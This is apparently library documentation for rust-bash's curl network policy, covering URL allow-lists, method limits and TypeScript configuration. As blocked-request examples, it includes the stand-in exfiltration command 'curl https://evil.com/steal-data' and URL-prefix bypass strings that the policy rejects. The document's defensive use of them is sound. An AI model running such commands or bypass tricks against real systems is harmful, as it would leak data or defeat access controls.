# Network Access

## Goal

Allow scripts to make controlled HTTP requests via `curl`, with URL allow-listing and method restrictions.

## Network Is Disabled by Default

By default, all network access is blocked. The `curl` command will fail:

```rust
use rust_bash::RustBashBuilder;

let mut shell = RustBashBuilder::new().build().unwrap();
let result = shell.exec("curl https://example.com").unwrap();
assert_ne!(result.exit_code, 0);
assert!(result.stderr.contains("network access is disabled"));
```

## Enabling Network Access

Use `NetworkPolicy` to enable `curl` with an allow-list of URL prefixes:

```rust
use rust_bash::{RustBashBuilder, NetworkPolicy};

let mut shell = RustBashBuilder::new()
    .network_policy(NetworkPolicy {
        enabled: true,
        allowed_url_prefixes: vec![
            "https://api.example.com/".into(),
            "https://httpbin.org/".into(),
        ],
        ..Default::default()
    })
    .build()
    .unwrap();

// Allowed — matches a prefix
// shell.exec("curl https://api.example.com/v1/users").unwrap();

// Blocked — no matching prefix
let result = shell.exec("curl https://evil.com/steal-data").unwrap();
assert_ne!(result.exit_code, 0);
```

## NetworkPolicy Fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | `bool` | `false` | Master switch for network access |
| `allowed_url_prefixes` | `Vec<String>` | `[]` | URLs must start with one of these prefixes |
| `allowed_methods` | `HashSet<String>` | `{"GET", "POST"}` | Allowed HTTP methods |
| `max_redirects` | `usize` | `5` | Maximum redirect follows |
| `max_response_size` | `usize` | `10 MB` | Maximum response body size in bytes |
| `timeout` | `Duration` | `30s` | Per-request timeout |

## Restricting HTTP Methods

By default only GET and POST are allowed. Customize as needed:

```rust
use rust_bash::{RustBashBuilder, NetworkPolicy};
use std::collections::HashSet;

let mut shell = RustBashBuilder::new()
    .network_policy(NetworkPolicy {
        enabled: true,
        allowed_url_prefixes: vec!["https://api.example.com/".into()],
        allowed_methods: HashSet::from([
            "GET".into(),
            "POST".into(),
            "PUT".into(),
            "DELETE".into(),
        ]),
        ..Default::default()
    })
    .build()
    .unwrap();
```

## Using curl in Scripts

rust-bash's `curl` supports common flags:

```bash
# GET request
curl https://api.example.com/users

# POST with data
curl -X POST -d '{"name":"alice"}' -H 'Content-Type: application/json' https://api.example.com/users

# Save response to file
curl -o /output.json https://api.example.com/data

# Include response headers
curl -i https://api.example.com/status

# Fail silently on HTTP errors
curl -f https://api.example.com/might-404

# Write-out format (e.g., status code)
curl -w '%{http_code}' -o /dev/null https://api.example.com/health
```

## Combining with jq for API Workflows

```bash
# Fetch JSON and extract a field
curl -s https://api.example.com/user/1 | jq -r '.name'

# Post data, check status
curl -s -X POST -d '{"key":"val"}' https://api.example.com/items | jq '.id'
```

## Security Considerations

- **URL normalization**: URLs are parsed and normalized before prefix matching to prevent bypasses (e.g., `https://api.example.com@evil.com/` is rejected).
- **No subdomain confusion**: A prefix of `https://api.example.com` (without trailing slash) won't match `https://api.example.com.evil.com/` — the URL is normalized with `url::Url` which appends a trailing slash.
- **Method validation**: HTTP methods are uppercased before comparison.

For maximum safety, always use trailing slashes in URL prefixes:

```rust
use rust_bash::NetworkPolicy;

// Good — specific path prefix with trailing slash
let good = NetworkPolicy {
    enabled: true,
    allowed_url_prefixes: vec!["https://api.example.com/v1/".into()],
    ..Default::default()
};

// Less specific — allows any path on the domain
let broad = NetworkPolicy {
    enabled: true,
    allowed_url_prefixes: vec!["https://api.example.com/".into()],
    ..Default::default()
};
```

---

## TypeScript: Network Configuration

The `@rust-bash/core` npm package supports the same network policy:

```typescript
import { Bash } from '@rust-bash/core';

const bash = await Bash.create(createBackend, {
  network: {
    enabled: true,
    allowedUrlPrefixes: [
      'https://api.example.com/',
      'https://httpbin.org/',
    ],
    allowedMethods: ['GET', 'POST'],
    maxResponseSize: 10 * 1024 * 1024, // 10 MB
    maxRedirects: 5,
    timeoutSecs: 30,
  },
});

// Allowed — matches a prefix
await bash.exec('curl https://api.example.com/v1/users');

// Blocked — no matching prefix
const result = await bash.exec('curl https://evil.com/steal-data');
console.log(result.exitCode); // non-zero
```

### NetworkConfig Fields (TypeScript)

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | `boolean` | `false` | Master switch for network access |
| `allowedUrlPrefixes` | `string[]` | `[]` | URLs must start with one of these |
| `allowedMethods` | `string[]` | `['GET', 'POST']` | Allowed HTTP methods |
| `maxResponseSize` | `number` | `10485760` | Max response body size in bytes |
| `maxRedirects` | `number` | `5` | Max redirect follows |
| `timeoutSecs` | `number` | `30` | Per-request timeout in seconds |

> **Note:** Network access is only available when using the native addon backend on Node.js. The WASM backend in browsers does not support `curl`.
